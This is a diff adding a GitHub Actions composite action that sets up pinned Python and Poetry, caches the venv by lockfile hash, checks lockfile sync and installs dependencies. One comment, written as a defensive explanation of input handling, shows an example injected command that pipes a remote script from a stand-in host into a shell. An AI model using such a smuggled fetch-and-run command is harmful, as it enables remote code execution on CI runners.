@@ -1,0 +1,65 @@
+name: "Set up Python + Poetry"
+description: >-
+  Installs the pinned Python and Poetry, restores the dependency cache, and
+  installs the locked dependency set. Factored out because four CI jobs need the
+  identical environment and drift between copies of this block is how "works in
+  the lint job, fails in the test job" starts.
+
+inputs:
+  python-version:
+    description: "Python version to install."
+    required: false
+    default: "3.11"
+  poetry-version:
+    description: >-
+      Poetry version. MUST be 2.x: poetry.lock is lock-version 2.1 and Poetry
+      1.x cannot read it.
+    required: false
+    default: "2.2.1"
+  install-args:
+    description: "Extra args passed to `poetry install`."
+    required: false
+    default: ""
+
+runs:
+  using: composite
+  steps:
+    - name: Set up Python
+      uses: actions/setup-python@ece7cb06caefa5fff74198d8649806c4678c61a1 # v6
+      with:
+        python-version: ${{ inputs.python-version }}
+
+    - name: Install Poetry
+      uses: snok/install-poetry@a783c322200f0519c7926aa6faa857c4e23e9263 # v1
+      with:
+        version: ${{ inputs.poetry-version }}
+        virtualenvs-create: true
+        virtualenvs-in-project: true
+
+    - name: Restore dependency cache
+      id: cache
+      uses: actions/cache@0057852bfaa89a56745cba8c7296529d2fc39830 # v4
+      with:
+        path: .venv
+        # Keyed on the LOCKFILE, not on pyproject.toml. pyproject carries caret
+        # ranges; the lockfile carries the exact resolved versions, so it is the
+        # only correct cache key. Python and Poetry versions are in the key
+        # because a venv is not portable across either.
+        key: venv-${{ runner.os }}-py${{ inputs.python-version }}-poetry${{ inputs.poetry-version }}-${{ hashFiles('poetry.lock') }}
+
+    - name: Verify poetry.lock is in sync with pyproject.toml
+      shell: bash
+      # Runs before install so a stale lockfile fails here with a clear message
+      # rather than as a confusing resolution error later. This is the gate that
+      # makes the tracked lockfile meaningful.
+      run: poetry check --lock
+
+    - name: Install dependencies
+      shell: bash
+      # install-args goes through an intermediate env var rather than being
+      # interpolated straight into the shell. `${{ }}` expansion happens before
+      # the shell sees the line, so an input containing `; curl evil.sh | sh`
+      # would execute. Quoting an env var instead keeps it as data.
+      env:
+        INSTALL_ARGS: ${{ inputs.install-args }}
+      run: poetry install --no-interaction ${INSTALL_ARGS}
